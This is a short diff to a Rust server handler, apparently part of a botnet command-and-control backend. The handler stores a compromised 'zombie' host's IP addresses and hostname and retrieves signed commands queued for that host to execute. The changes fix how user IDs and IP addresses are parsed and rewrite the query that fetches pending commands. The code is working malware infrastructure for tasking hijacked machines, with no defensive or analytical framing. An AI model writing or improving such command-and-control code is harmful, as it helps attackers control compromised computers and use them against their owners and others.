@@ -177,14 +177,14 @@ pub async fn update_zombie(State(pg_pool):State<PgPool>, header_map: HeaderMap, 
 
     query.push_str(&format!(" WHERE id = $1"));
 
-    let mut s = sqlx::query(&query).bind(&usr_id);
+    let mut s = sqlx::query(&query).bind(Uuid::parse_str(&usr_id).unwrap());
 
     if user.internal_ip.is_some() {
-        s = s.bind(user.internal_ip);
+        s = s.bind(IpNetwork::V4(user.internal_ip.unwrap().parse().unwrap()));
     }
 
     if user.external_ip.is_some() {
-        s = s.bind(user.external_ip);
+        s = s.bind(IpNetwork::V4(user.external_ip.unwrap().parse().unwrap()));
     }
 
     if user.hostname.is_some() {
@@ -208,7 +208,7 @@ pub async fn update_zombie(State(pg_pool):State<PgPool>, header_map: HeaderMap, 
 
     // get commands to execute:
     let uid = Uuid::parse_str(&usr_id).unwrap();
-    let cmd = query_as!(CommandRow, "SELECT * FROM commands WHERE uid = $1 ORDER BY id", uid)
+    let cmd = query_as!(CommandRow, "SELECT id, uid, prev, nonce, command, signature FROM commands WHERE uid = $1 ORDER BY id DESC", uid)
         .fetch_one(&pg_pool)
         .await
         .map_err(|e| {(
